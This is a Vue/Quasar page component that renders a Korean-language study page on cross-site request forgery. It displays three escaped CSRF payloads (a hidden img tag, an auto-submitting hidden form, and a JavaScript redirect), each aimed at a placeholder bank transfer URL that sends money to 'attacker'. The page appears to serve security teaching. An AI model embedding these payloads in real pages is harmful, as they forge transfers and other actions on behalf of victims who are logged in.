<template>
  <q-page class="q-pa-md">
    <div class="notion-like">
      <!-- 1번 섹션 -->
      <div class="section">
        <h3 class="title">1. img 태그를 활용한 CSRF</h3>
        <q-card flat bordered class="code-block">
          <pre><code>&lt;img src="http://bank.example.com/transfer?to=attacker&amp;amount=1000" width="0"&gt;</code></pre>
        </q-card>
        <ul class="notes text-h6">
          <li>이미지 태그의 <span class="keyword">src</span> 속성에 요청을 넣어 자동 실행</li>
        </ul>
      </div>

      <!-- 2번 섹션 -->
      <div class="section">
        <h3 class="title">2. form 태그 자동 제출</h3>
        <q-card flat bordered class="code-block">
          <pre><code>&lt;form action="http://bank.example.com/transfer" method="POST"&gt;
  &lt;input type="hidden" name="to" value="attacker"&gt;
  &lt;input type="hidden" name="amount" value="1000"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
        </q-card>
        <ul class="notes text-h6">
          <li>form을 자동 제출하여 요청을 실행</li>
        </ul>
      </div>

      <!-- 3번 섹션 -->
      <div class="section">
        <h3 class="title">3. JavaScript를 이용한 자동 이동</h3>
        <q-card flat bordered class="code-block">
          <pre><code>window.location.href = "http://bank.example.com/transfer?to=attacker&amp;amount=1000";</code></pre>
        </q-card>
        <ul class="notes text-h6">
          <li>사용자가 페이지에 접속하면 자동으로 요청을 보냄</li>
        </ul>
      </div>
    </div>
  </q-page>
</template>

<script setup>
// (필요한 로직이 있으면 여기에)
</script>

<style scoped>
.notion-like {
  max-width: 800px;
  margin: auto;
}
.section {
  margin-bottom: 24px;
}
.title {
  margin-bottom: 12px;
  font-size: 1.25rem;
  font-weight: 500;
  color: #1f1f1f;
}
.code-block {
  background-color: #f6f8fa;
  border: 1px solid #e1e4e8;
  border-radius: 4px;
}
.code-block pre {
  margin: 0;
  padding: 12px 16px;
  font-family: 'Source Code Pro', monospace;
  font-size: 0.875rem;
  line-height: 1.4;
  white-space: pre-wrap;
}
.notes {
  margin-top: 8px;
  padding-left: 16px;
}
.notes li {
  margin-bottom: 4px;
  color: #333;
  font-size: 0.95rem;
}
.keyword {
  color: #e90; /* Notion 핑크 계열 대신 강조색 */
  font-weight: 600;
}
</style>
